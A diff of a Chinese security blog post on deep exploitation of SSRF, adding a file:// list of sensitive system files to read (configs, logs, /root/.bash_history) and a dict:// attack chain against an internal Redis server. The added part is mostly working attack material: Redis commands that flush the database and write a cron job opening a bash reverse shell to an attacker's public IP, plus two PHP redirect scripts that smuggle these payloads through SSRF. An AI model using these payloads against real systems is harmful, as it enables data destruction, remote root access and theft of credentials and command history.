@@ -71,17 +71,17 @@
 
 
 
-<meta name="description" content="ssrf之深度利用file协议任意文件读取的深度利用查看版本信息linux:/proc/version/etc/issue/etc/redhat-release/proc/cpuinfowindows: 查看网络环境/etc/hosts/etc/sysconfig/network-scripts/ifcfg-eth0 针对centos 6.5查看web服务的配置信息/etc/httpd/conf/">
+<meta name="description" content="ssrf之深度利用file协议任意文件读取的深度利用查看版本信息linux:1234/proc/version/etc/issue/etc/redhat-release/proc/cpuinfo windows:C:\windows\win.ini 查看网络环境12/etc/hosts/etc/sysconfig/network-scripts/ifcfg-eth0 针对centos 6.5查看w">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssrf之深度利用">
 <meta property="og:url" content="http://www.cuittk.cn/2019/12/07/ssrf之深度利用/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
-<meta property="og:description" content="ssrf之深度利用file协议任意文件读取的深度利用查看版本信息linux:/proc/version/etc/issue/etc/redhat-release/proc/cpuinfowindows: 查看网络环境/etc/hosts/etc/sysconfig/network-scripts/ifcfg-eth0 针对centos 6.5查看web服务的配置信息/etc/httpd/conf/">
+<meta property="og:description" content="ssrf之深度利用file协议任意文件读取的深度利用查看版本信息linux:1234/proc/version/etc/issue/etc/redhat-release/proc/cpuinfo windows:C:\windows\win.ini 查看网络环境12/etc/hosts/etc/sysconfig/network-scripts/ifcfg-eth0 针对centos 6.5查看w">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-07T04:56:24.254Z">
+<meta property="og:updated_time" content="2020-01-29T10:45:48.363Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ssrf之深度利用">
-<meta name="twitter:description" content="ssrf之深度利用file协议任意文件读取的深度利用查看版本信息linux:/proc/version/etc/issue/etc/redhat-release/proc/cpuinfowindows: 查看网络环境/etc/hosts/etc/sysconfig/network-scripts/ifcfg-eth0 针对centos 6.5查看web服务的配置信息/etc/httpd/conf/">
+<meta name="twitter:description" content="ssrf之深度利用file协议任意文件读取的深度利用查看版本信息linux:1234/proc/version/etc/issue/etc/redhat-release/proc/cpuinfo windows:C:\windows\win.ini 查看网络环境12/etc/hosts/etc/sysconfig/network-scripts/ifcfg-eth0 针对centos 6.5查看w">
 
 
 
@@ -348,12 +348,27 @@
       
 
       
-        <h2 id="ssrf之深度利用"><a href="#ssrf之深度利用" class="headerlink" title="ssrf之深度利用"></a>ssrf之深度利用</h2><h3 id="file协议任意文件读取的深度利用"><a href="#file协议任意文件读取的深度利用" class="headerlink" title="file协议任意文件读取的深度利用"></a>file协议任意文件读取的深度利用</h3><h4 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h4><p>linux:<br>/proc/version<br>/etc/issue<br>/etc/redhat-release<br>/proc/cpuinfo<br>windows:</p>
-<h4 id="查看网络环境"><a href="#查看网络环境" class="headerlink" title="查看网络环境"></a>查看网络环境</h4><p>/etc/hosts<br>/etc/sysconfig/network-scripts/ifcfg-eth0</p>
-<h4 id="针对centos-6-5"><a href="#针对centos-6-5" class="headerlink" title="针对centos 6.5"></a>针对centos 6.5</h4><h5 id="查看web服务的配置信息"><a href="#查看web服务的配置信息" class="headerlink" title="查看web服务的配置信息"></a>查看web服务的配置信息</h5><p>/etc/httpd/conf/httpd.conf<br>/etc/rc.d/init.d/nginx<br>/etc/init.d/nginx<br>/etc/nginx/nginx.conf<br>/etc/profile    环境变量</p>
-<h5 id="各种日志信息"><a href="#各种日志信息" class="headerlink" title="各种日志信息"></a>各种日志信息</h5><p>/var/log/wtmp    登录成功的记录</p>
-<h5 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h5><p>/root/.bash_history        一般root目录没权限访问<br>/home/wwwroot/.bash_history</p>
-<h3 id="dict协议的深度利用"><a href="#dict协议的深度利用" class="headerlink" title="dict协议的深度利用"></a>dict协议的深度利用</h3>
+        <h2 id="ssrf之深度利用"><a href="#ssrf之深度利用" class="headerlink" title="ssrf之深度利用"></a>ssrf之深度利用</h2><h3 id="file协议任意文件读取的深度利用"><a href="#file协议任意文件读取的深度利用" class="headerlink" title="file协议任意文件读取的深度利用"></a>file协议任意文件读取的深度利用</h3><h4 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h4><p>linux:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/proc/version</div><div class="line">/etc/issue</div><div class="line">/etc/redhat-release</div><div class="line">/proc/cpuinfo</div></pre></td></tr></table></figure></p>
+<p>windows:<br><code>C:\windows\win.ini</code></p>
+<h4 id="查看网络环境"><a href="#查看网络环境" class="headerlink" title="查看网络环境"></a>查看网络环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc/hosts</div><div class="line">/etc/sysconfig/network-scripts/ifcfg-eth0</div></pre></td></tr></table></figure>
+<h4 id="针对centos-6-5"><a href="#针对centos-6-5" class="headerlink" title="针对centos 6.5"></a>针对centos 6.5</h4><h5 id="查看web服务的配置信息"><a href="#查看web服务的配置信息" class="headerlink" title="查看web服务的配置信息"></a>查看web服务的配置信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/etc/httpd/conf/httpd.conf</div><div class="line">/etc/rc.d/init.d/nginx</div><div class="line">/etc/init.d/nginx</div><div class="line">/etc/nginx/nginx.conf</div><div class="line">/etc/profile	环境变量</div></pre></td></tr></table></figure>
+<h5 id="各种日志信息"><a href="#各种日志信息" class="headerlink" title="各种日志信息"></a>各种日志信息</h5><p><code>/var/log/wtmp</code>    登录成功的记录</p>
+<h5 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h5><p><code>/root/.bash_history</code>        一般root目录没权限访问<br><code>/home/wwwroot/.bash_history</code></p>
+<h3 id="dict协议的深度利用"><a href="#dict协议的深度利用" class="headerlink" title="dict协议的深度利用"></a>dict协议的深度利用</h3><p>关于dict协议：</p>
+<blockquote>
+<p>dict://serverip:port/命令:参数<br>向服务器的端口请求 命令:参数，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</p>
+</blockquote>
+<p>如果服务端不支持gopher协议，可尝试dict协议，不过通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。</p>
+<p>curl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。<br>可通过以下三条命令看是否能利用dict:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/xx.php?url=dict://172.21.0.2:6379/info</div><div class="line">/xx.php?url=dict://172.21.0.2:6379/get:user</div><div class="line">/xx.php?url=dict://172.21.0.2:6379/flushall</div></pre></td></tr></table></figure></p>
+<h4 id="使用dict协议向Redis数据库写shell"><a href="#使用dict协议向Redis数据库写shell" class="headerlink" title="使用dict协议向Redis数据库写shell"></a>使用dict协议向Redis数据库写shell</h4><p>攻击成功的前提条件是：redis是以root权限运行的。<br>redis反弹shell命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">flushall</div><div class="line">set 1 &quot;\n\n\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/公网ip/监听端口 0&gt;&amp;1\n\n\n\n&quot;</div><div class="line">config set dir /var/spool/cron/</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure></p>
+<p>s.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$ip = $_GET[&apos;ip&apos;];			//redis ip</div><div class="line">$port = $_GET[&apos;port&apos;];		//redis 端口</div><div class="line">$bhost = $_GET[&apos;bhost&apos;];		//反弹ip</div><div class="line">$bport = $_GET[&apos;bport&apos;];		//反弹端口</div><div class="line">$scheme = $_GET[&apos;s&apos;];		//协议</div><div class="line">header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;); ?&gt;</div></pre></td></tr></table></figure></p>
+<p>302.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$ip = $_GET[&apos;ip&apos;];			//redis ip</div><div class="line">$port = $_GET[&apos;port&apos;];		//redis 端口</div><div class="line">$scheme = $_GET[&apos;s&apos;];		//协议</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">header(&quot;Location: $scheme://$ip:$port/$data&quot;); ?&gt;</div></pre></td></tr></table></figure></p>
+<p>1.先清除没用的数据，防止定时任务执行失败<br><code>/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=flushall</code><br><code>/url.php?url=dict://172.21.0.2:6379/flushall</code></p>
+<p>2.利302跳转写入反弹命令<br><code>/url.php?url=http://xxxx/s.php?s=dict%26ip=172.21.0.2%26port=6379%26bhost=公网ip%26bport=监听端口</code><br><code>/url.php?url=dict://172.21.0.2:6379/set:1:&quot;\n\n\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/公网ip/监听端口 0&gt;&amp;1\n\n\n\n&quot;</code></p>
+<p>3.设置导出路径<br><code>/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=config:set:dir:/var/spool/cron/</code><br><code>/url.php?url=dict://172.21.0.2:6379/config:set:dir:/var/spool/cron/</code></p>
+<p>4.设置导出名字<br><code>/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=config:set:dbfilename:root</code><br><code>/url.php?url=dict://172.21.0.2:6379/config:set:dbfilename:root</code></p>
+<p>5.导出<br><code>/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=save</code><br><code>/url.php?url=dict://172.21.0.2:6379/save</code></p>
+
       
     </div>
     
@@ -471,7 +486,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-count">57</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -561,7 +576,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf之深度利用"><span class="nav-number">1.</span> <span class="nav-text">ssrf之深度利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file协议任意文件读取的深度利用"><span class="nav-number">1.1.</span> <span class="nav-text">file协议任意文件读取的深度利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#查看版本信息"><span class="nav-number">1.1.1.</span> <span class="nav-text">查看版本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看网络环境"><span class="nav-number">1.1.2.</span> <span class="nav-text">查看网络环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#针对centos-6-5"><span class="nav-number">1.1.3.</span> <span class="nav-text">针对centos 6.5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#查看web服务的配置信息"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">查看web服务的配置信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#各种日志信息"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">各种日志信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#历史命令"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">历史命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict协议的深度利用"><span class="nav-number">1.2.</span> <span class="nav-text">dict协议的深度利用</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf之深度利用"><span class="nav-number">1.</span> <span class="nav-text">ssrf之深度利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file协议任意文件读取的深度利用"><span class="nav-number">1.1.</span> <span class="nav-text">file协议任意文件读取的深度利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#查看版本信息"><span class="nav-number">1.1.1.</span> <span class="nav-text">查看版本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看网络环境"><span class="nav-number">1.1.2.</span> <span class="nav-text">查看网络环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#针对centos-6-5"><span class="nav-number">1.1.3.</span> <span class="nav-text">针对centos 6.5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#查看web服务的配置信息"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">查看web服务的配置信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#各种日志信息"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">各种日志信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#历史命令"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">历史命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict协议的深度利用"><span class="nav-number">1.2.</span> <span class="nav-text">dict协议的深度利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用dict协议向Redis数据库写shell"><span class="nav-number">1.2.1.</span> <span class="nav-text">使用dict协议向Redis数据库写shell</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -584,7 +599,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2019</span>
+  <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
